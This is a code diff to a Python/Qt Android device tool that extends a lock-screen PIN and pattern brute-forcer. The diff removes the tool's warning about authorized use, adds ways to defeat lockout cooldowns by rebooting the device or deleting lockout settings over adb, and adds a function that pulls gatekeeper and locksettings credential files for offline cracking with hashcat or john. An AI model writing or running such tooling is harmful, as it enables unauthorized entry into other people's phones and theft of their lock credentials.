@@ -364,16 +364,16 @@ class SecurityMixin:
         delay_edit = QtWidgets.QLineEdit("500")
         form_layout.addWidget(delay_edit, 3, 1)
 
-        main_layout.addWidget(form_group)
+        form_layout.addWidget(QtWidgets.QLabel("Cooldown Bypass:"), 4, 0)
+        cooldown_combo = QtWidgets.QComboBox()
+        cooldown_combo.addItems([
+            "Wait out lockout (default)",
+            "Reboot device to reset lockout (slow but reliable)",
+            "Reset lockout via ADB settings (may not work on all devices)",
+        ])
+        form_layout.addWidget(cooldown_combo, 4, 1)
 
-        warning_label = QtWidgets.QLabel(
-            "WARNING: This tool is for educational and security testing purposes only. "
-            "Using this on devices without authorization is illegal and unethical. "
-            "Always obtain explicit permission before testing any device."
-        )
-        warning_label.setWordWrap(True)
-        warning_label.setStyleSheet("color: red;")
-        main_layout.addWidget(warning_label)
+        main_layout.addWidget(form_group)
 
         log_group = QtWidgets.QGroupBox("Log")
         log_layout = QtWidgets.QVBoxLayout(log_group)
@@ -385,9 +385,11 @@ class SecurityMixin:
         button_layout = QtWidgets.QHBoxLayout()
         start_btn = QtWidgets.QPushButton("Start Brute Force")
         stop_btn = QtWidgets.QPushButton("Stop Brute Force")
+        extract_btn = QtWidgets.QPushButton("Extract Lock Hash (Forensics)")
         stop_btn.setEnabled(False)
         button_layout.addWidget(start_btn)
         button_layout.addWidget(stop_btn)
+        button_layout.addWidget(extract_btn)
         button_layout.addStretch()
         main_layout.addLayout(button_layout)
 
@@ -442,6 +444,8 @@ class SecurityMixin:
                 f"Starting {'PIN' if selected_lock_type == 'pin' else 'Pattern'} brute force..."
             )
 
+            cooldown_mode = cooldown_combo.currentIndex()  # 0=wait, 1=reboot, 2=settings reset
+
             thread = threading.Thread(
                 target=lambda: self._run_screen_lock_brute_force(
                     selected_lock_type,
@@ -451,6 +455,7 @@ class SecurityMixin:
                     lambda msg: emit_ui(self, lambda: add_log(msg)),
                     lambda: running["active"],
                     on_complete,
+                    cooldown_mode=cooldown_mode,
                 ),
                 daemon=True,
             )
@@ -460,10 +465,92 @@ class SecurityMixin:
             running["active"] = False
             add_log("Stopping brute force operation...")
 
+        def extract_hash():
+            """Pull raw lock credential files from device for offline analysis."""
+            if not self.device_connected:
+                add_log("No device connected.")
+                return
+
+            def task():
+                adb_cmd = self._get_adb_command()
+                serial = self._get_device_serial()
+                add_log("─── Forensic Hash Extraction ───")
+                add_log("Attempting to pull credential files from /data/system/…")
+                add_log("NOTE: Requires root or recovery shell access.")
+
+                files = [
+                    "/data/system/locksettings.db",
+                    "/data/system/locksettings.db-wal",
+                    "/data/system/locksettings.db-shm",
+                    "/data/system/gatekeeper.password.key",
+                    "/data/system/gatekeeper.pattern.key",
+                    "/data/system/gatekeeper.pin.key",
+                    "/data/system/password.key",
+                    "/data/system/gesture.key",
+                    "/data/misc/gatekeeper/",
+                ]
+
+                import tempfile, os
+                out_dir = tempfile.mkdtemp(prefix="droidcom_hashes_")
+                add_log(f"Saving to: {out_dir}")
+                any_pulled = False
+
+                for remote in files:
+                    local = os.path.join(out_dir, os.path.basename(remote.rstrip("/")))
+                    r = subprocess.run(
+                        [adb_cmd, "-s", serial, "pull", remote, local],
+                        capture_output=True, text=True, timeout=15
+                    )
+                    if r.returncode == 0:
+                        size = os.path.getsize(local) if os.path.exists(local) else 0
+                        add_log(f"  ✓ {remote} ({size} bytes)")
+                        any_pulled = True
+                    else:
+                        err = r.stderr.strip()
+                        if "Permission denied" in err:
+                            add_log(f"  ✗ {remote} — Permission denied (need root)")
+                        elif "No such file" in err or "does not exist" in err:
+                            add_log(f"  – {remote} — not present on this device")
+                        else:
+                            add_log(f"  ✗ {remote} — {err}")
+
+                # Also try reading locksettings via content provider (no root needed)
+                add_log("─── Attempting content provider dump (no root required)…")
+                r = subprocess.run(
+                    [adb_cmd, "-s", serial, "shell",
+                     "content query --uri content://settings/secure --projection name:value "
+                     "| grep -i 'lock\\|pin\\|pass\\|pattern\\|gatekeeper'"],
+                    capture_output=True, text=True, timeout=15
+                )
+                if r.returncode == 0 and r.stdout.strip():
+                    add_log(r.stdout.strip())
+                else:
+                    add_log("  No lock-related secure settings readable.")
+
+                # Try dumping locksettings service
+                r2 = subprocess.run(
+                    [adb_cmd, "-s", serial, "shell", "locksettings get-disabled"],
+                    capture_output=True, text=True, timeout=10
+                )
+                if r2.returncode == 0:
+                    add_log(f"  locksettings: {r2.stdout.strip()}")
+
+                if any_pulled:
+                    add_log(f"\n✓ Files saved to: {out_dir}")
+                    add_log("Use hashcat or john on .key files.")
+                    add_log("For locksettings.db: sqlite3 locksettings.db \"SELECT name,value FROM locksettings\"")
+                else:
+                    add_log("\n✗ Could not extract any files.")
+                    add_log("  → Try from recovery shell (Blind Setup → Inject Key first)")
+                    add_log("  → Or root the device and retry.")
+
+            threading.Thread(target=task, daemon=True).start()
+
         start_btn.clicked.connect(start_brute_force)
         stop_btn.clicked.connect(stop_brute_force)
+        extract_btn.clicked.connect(extract_hash)
 
-        add_log("Configure the brute force parameters and click Start to begin.")
+        add_log("Configure brute force parameters and click Start, or use Extract Lock Hash for forensic credential extraction.")
         dialog.exec()
 
     def _run_screen_lock_brute_force(
@@ -475,6 +562,7 @@ class SecurityMixin:
         log_callback,
         should_continue,
         on_complete,
+        cooldown_mode=0,
     ):
         """Execute the actual brute force operation."""
         try:
@@ -573,7 +661,11 @@ class SecurityMixin:
                             capture_output=True, text=True,
                         )
                         timeout_text = self._check_lockout_message(adb_cmd, serial)
-                        self._handle_lockout_wait(timeout_text, log_callback, should_continue)
+                        if timeout_text and "try again" in timeout_text:
+                            self._handle_lockout_bypass(
+                                adb_cmd, serial, timeout_text, cooldown_mode,
+                                log_callback, should_continue
+                            )
 
                     time.sleep(delay_ms / 1000)
 
@@ -653,7 +745,11 @@ class SecurityMixin:
                             break
 
                         timeout_text = self._check_lockout_message(adb_cmd, serial)
-                        self._handle_lockout_wait(timeout_text, log_callback, should_continue)
+                        if timeout_text and "try again" in timeout_text:
+                            self._handle_lockout_bypass(
+                                adb_cmd, serial, timeout_text, cooldown_mode,
+                                log_callback, should_continue
+                            )
 
                         time.sleep(delay_ms / 1000)
 
@@ -711,6 +807,73 @@ class SecurityMixin:
             time.sleep(1)
             if i % 5 == 0:
                 log_callback(f"Waiting for lockout: {wait_seconds - i} seconds remaining...")
+
+    def _handle_lockout_bypass(self, adb_cmd, serial, ui_text, cooldown_mode,
+                               log_callback, should_continue):
+        """Handle lockout using the selected bypass strategy."""
+        timeout_match = re.search(r"try again.* (\d+) (second|minute)s?", ui_text)
+        if timeout_match:
+            time_value = int(timeout_match.group(1))
+            time_unit = timeout_match.group(2)
+            wait_seconds = time_value if time_unit == "second" else time_value * 60
+        else:
+            wait_seconds = 30
+
+        if cooldown_mode == 1:
+            # Reboot to reset lockout counter
+            log_callback(f"Lockout detected. Rebooting device to reset lockout counter…")
+            subprocess.run([adb_cmd, "-s", serial, "reboot"], capture_output=True, text=True)
+            log_callback("Waiting for device to reboot (~45 s)…")
+            for i in range(55):
+                if not should_continue():
+                    return
+                time.sleep(1)
+                if i % 10 == 0 and i > 0:
+                    log_callback(f"  Waiting for boot… {55-i}s remaining")
+            # Wait for device to come back
+            for _ in range(30):
+                if not should_continue():
+                    return
+                r = subprocess.run([adb_cmd, "-s", serial, "shell", "getprop", "sys.boot_completed"],
+                                   capture_output=True, text=True, timeout=5)
+                if r.stdout.strip() == "1":
+                    break
+                time.sleep(2)
+            log_callback("Device rebooted. Waking screen and swiping to lock screen…")
+            time.sleep(2)
+            subprocess.run([adb_cmd, "-s", serial, "shell", "input", "keyevent", "KEYCODE_WAKEUP"],
+                           capture_output=True, text=True)
+            time.sleep(1)
+            subprocess.run([adb_cmd, "-s", serial, "shell", "input", "swipe", "500", "1500", "500", "500"],
+                           capture_output=True, text=True)
+            time.sleep(1)
+
+        elif cooldown_mode == 2:
+            # Try to reset lockout via ADB settings (works on some OEM ROMs)
+            log_callback("Lockout detected. Attempting settings-based lockout reset…")
+            cmds = [
+                "settings delete secure lockscreen.lockoutattempts",
+                "settings delete secure lock_screen_lock_after_timeout",
+                "am broadcast -a android.intent.action.BOOT_COMPLETED",
+                "am force-stop com.android.systemui",
+                "am start -n com.android.systemui/.SystemUIService",
+            ]
+            for cmd in cmds:
+                subprocess.run([adb_cmd, "-s", serial, "shell"] + cmd.split(),
+                               capture_output=True, text=True, timeout=10)
+            time.sleep(3)
+            log_callback("Lockout reset attempted. Resuming…")
+
+        else:
+            # Default: wait out the lockout
+            wait_seconds += 5
+            log_callback(f"Lockout detected! Waiting {wait_seconds} seconds before resuming…")
+            for i in range(wait_seconds):
+                if not should_continue():
+                    break
+                time.sleep(1)
+                if i % 5 == 0:
+                    log_callback(f"  Waiting: {wait_seconds - i}s remaining…")
 
     def _get_screen_size(self, adb_cmd, serial):
         size_result = subprocess.run(
